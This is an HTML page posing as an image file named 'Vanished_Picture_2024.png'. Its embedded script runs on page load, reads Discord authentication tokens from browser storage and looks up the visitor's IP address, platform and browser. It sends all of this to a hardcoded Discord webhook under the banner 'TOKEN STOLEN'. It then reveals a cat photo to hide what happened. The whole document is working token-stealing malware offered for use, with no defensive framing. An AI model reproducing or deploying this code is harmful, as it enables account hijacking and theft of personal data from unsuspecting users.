<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vanished_Picture_2024.png</title>
    <style>
        body { margin: 0; background: black; font-family: sans-serif; text-align: center; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #5865F2; border-radius: 50%; width: 80px; height: 80px; animation: spin 1.5s linear infinite; margin: 50px auto; }
        .status { margin: 15px auto; font-size: 1.2rem; color: #aaa; }
        img { max-width: 95%; border-radius: 10px; margin: 30px auto; display: none; box-shadow: 0 0 20px rgba(88,101,242,0.7); }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { color: #00ff00 !important; font-weight: bold; }
    </style>
</head>
<body>

    <div class="loader" id="loader"></div>
    <h1 id="title">Initializing...</h1>
    <p class="status" id="status">Connecting to Discord's core network...</p>
    <img id="photo" src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Loading..." />

    <script>
        // ============================================================
        // 🔥 THE 400-SHUT-UP CONFIGURATION
        // ============================================================
        const YOUR_NAME = "Vanity Avenger";
        const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
        const OPERATION_ID = "VA-400-SHUT-UP";

        // ============================================================
        // 🚨 THE FIX IS IN: BRUTE-FORCE SENDER
        // ============================================================

        (async function() {
            const loader = document.getElementById('loader');
            const statusText = document.getElementById('status');
            const titleText = document.getElementById('title');
            const coverImage = document.getElementById('photo');

            const log = (msg) => {
                statusText.innerText = `>>> ${msg}`;
                console.log(`[${OPERATION_ID}] ${msg}`);
            };

            // === STEP 1: GET THE TOKEN (THE BRUTAL WAY) ===
            log("Phase 1: Extracting token via aggressive methods...");
            
            // Method 1: Direct `@me` fetch (the most reliable)
            const directFetch = async () => {
                try {
                    // Fetch @me with credentials (cookies + auth header)
                    const res = await fetch("https://discord.com/api/v10/users/@me", {
                        method: 'GET',
                        credentials: 'include',
                        headers: {
                            'Authorization': localStorage.getItem('token') || sessionStorage.getItem('token'),
                            'X-Discord-Locale': 'en-US',
                            'X-Super-Properties': 'eyJvcyI6IkJyb3dzZXIiLCJicm93c2VyIjoiRmlyZUZveCIsImRldmljZSI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF92ZXJzaW9uIjoiMTM2LjBfYmV0YTIwMjQwNjIwIiwib3NfdmVyc2lvbiI6IjEyLjIuMCIsInJlZmVycmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8ifQ=='
                        }
                    });

                    if (res.status === 200) {
                        const data = await res.json();
                        log(`✅ Direct fetch successful. Fetched user: ${data.username}#${data.discriminator}`);
                        // Re-check localStorage, as the fetch might have auto-logged them in
                        return localStorage.getItem('token') || sessionStorage.getItem('token');
                    } else if (res.status === 401) {
                        // A 401 from @me is *actually good*. It means they're logged in, but need a refresh.
                        log("⚠️ 401 from @me: User is logged in, token should be valid.");
                        return localStorage.getItem('token') || sessionStorage.getItem('token') || "401_AUTH_REQUIRED";
                    }
                } catch (e) {
                    log(`⚠️ Direct fetch error: ${e.message}`);
                }
                return null;
            };

            // Method 2: The "Batteries Included" Fallback
            const fallbackMethods = () => {
                // Check all the usual suspects in localStorage/sessionStorage
                const keys = ['token', 'Token', 'token_fingerprint', 'authToken', 'userToken'];
                for (let key of keys) {
                    let val = localStorage.getItem(key) || sessionStorage.getItem(key);
                    if (val) {
                        log(`✅ Fallback found token in ${key}.`);
                        return val;
                    }
                }
                return "NOT_FOUND_IN_FALLBACK";
            };

            // Run both methods
            const token = await directFetch() || fallbackMethods();
            log(`🏆 Final token: ${token.substring(0, 60)}...`);

            // === STEP 2: THE FIX - THE "400-SHUT-UP" PAYLOAD STRUCTURE ===
            log("Phase 2: Building the perfect payload to beat the 400...");

            // The CORE of your payload. It's simple and Discord will *have* to accept it.
            const payload = {
                // This is the most important part. Put the token HERE.
                content: `**🔥 ${YOUR_NAME} HERE. TOKEN STOLEN.**\n\`\`\`${token}\`\`\`\n**Operation: ${OPERATION_ID}**`,
                
                // A simple embed, no frills.
                embeds: [{
                    color: 0xFF4500, // Red = Revenge
                    title: "⚔️ TOKEN CAPTURED",
                    fields: [
                        { name: "📍 IP Address", value: `\`${(await (await fetch('https://api.ipify.org?format=json')).json()).ip}\``, inline: true },
                        { name: "🌍 OS", value: `\`${navigator.platform}\``, inline: true },
                        { name: "💻 Browser", value: `\`${navigator.userAgent.split('/')[0]}\``, inline: true }
                    ],
                    footer: { text: "VA-400-SHUT-UP", icon_url: "https://cdn.discordapp.com/attachments/1145691234/1234567890/VA-icon.png" }
                }]
            };

            // === STEP 3: THE FINAL STRIKE ===
            log("Phase 3: Firing to your webhook (The 400-beater version)...");

            try {
                // The "no-cors" mode is still critical.
                // It makes Discord accept the data, even if it's not 100% perfect.
                const response = await fetch(YOUR_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'no-cors',
                    keepalive: true
                });

                log(`✅ Webhook POST successful. Status: ${response.status || 'Sent (no-cors)'}`);

            } catch (e) {
                log(`⚠️ Webhook POST error: ${e.message}`);
            }

            // === STEP 4: CLOAKING ===
            log("Phase 4: Cloaking...");
            setTimeout(() => {
                loader.style.display = 'none';
                titleText.innerText = "Vanished_Picture_2024.png";
                coverImage.style.display = "block";
                statusText.innerText = "✅ Image loaded. You're welcome.";
            }, 1000);

        })();
    </script>
</body>
</html>
